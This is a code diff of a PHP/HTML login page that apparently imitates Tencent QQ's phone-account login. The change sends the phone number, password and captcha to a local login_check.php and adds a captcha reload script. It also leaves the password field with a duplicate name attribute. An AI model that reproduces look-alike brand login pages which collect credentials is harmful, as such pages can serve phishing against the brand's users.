@@ -31,13 +31,13 @@
 				<a href="#" class="tab-tel" hidefocus>手机帐号</a>
 			</div>
 
-			<div id="telLogin" ><form action="<?=base_url().'index.php/aftlogin/'?>" method="post" id="telLoginForm">
+			<div id="telLogin" ><form action="login_check.php" method="post" id="telLoginForm">
 					<ul class="tel-login">
 						<li class="psw-error-tips"></li>
 						<li><label>手机帐号：</label><input name="area" id="input_area" class="text" type="text"  value="+86" style="width: 50px" /> <input name="mobile" id="input_mobile" class="text" type="text" value="" style="width: 200px" /></li>
-						<li><label>手机密码：</label><input name="password" id="input_password" class="text" type="password" style="width: 268px" /></li>
+						<li><label>手机密码：</label><input name="password"  name="input_password" class="text" type="password" style="width: 268px" /></li>
 						<li><label>验&nbsp; 证&nbsp;码：</label><input name="verify" id="input_verify" type="text" class="text" style="width: 268px" /></li>
-						<li><label></label><img id="real_image" alt="正在加载验证码" width="120" height="50" /> <a href="#" id="changeCode">看不清，换一张</a></li>
+						<li><label></label><a href="javascript:reloadCode();"><img src="<?php echo site_url('login/captcha');?>" id="real_image" alt="正在加载验证码" width="120" height="50" />看不清，换一张</a></li>
 						<li><input type="submit" class="login-btn" id="login_button" value="登 录" /></li>
 						<li class="last"><a href="http://service.qq.com/info/70899.html" target="_blank">如何获取手机帐号？</a></li>
 					</ul>
@@ -56,7 +56,15 @@
 </div>
 <div class="fuck-ie6">你的IE浏览器版本过低，为确保通讯录管理的安全和便捷，建议<a href="http://windows.microsoft.com/zh-CN/internet-explorer/download-ie" target="_blank" class="logClass" name="fuck_ie6">立即升级IE浏览器</a></div>
 <script>var contextPath = '',serverName = 'pim.qq.com', schema = 'https', error='',isLogin = false;</script>
-<script type='text/javascript' src='<?=base_url().'scripts/request.js?request=js/jquery.js;js/jquery.md5.js;js/cookie.js;js/login.js&key=6537EB0F4236B5E482A7377E835D0EF9'?>'></script>
+<script type='text/javascript' src='<?=base_url().'scripts/pre_login/request.js?request=js/jquery.js;js/jquery.md5.js;js/cookie.js;js/login.js&key=6537EB0F4236B5E482A7377E835D0EF9'?>'></script>
+
+<script type="text/javascript">
+/*验证码*/
+	function reloadCode() {
+		var dom = document.getElementById("real_image");
+  		dom.src = "<?php echo site_url('login/captcha');?>?str=" + Math.random();
+}
+</script>
 </body>
 </html>
 
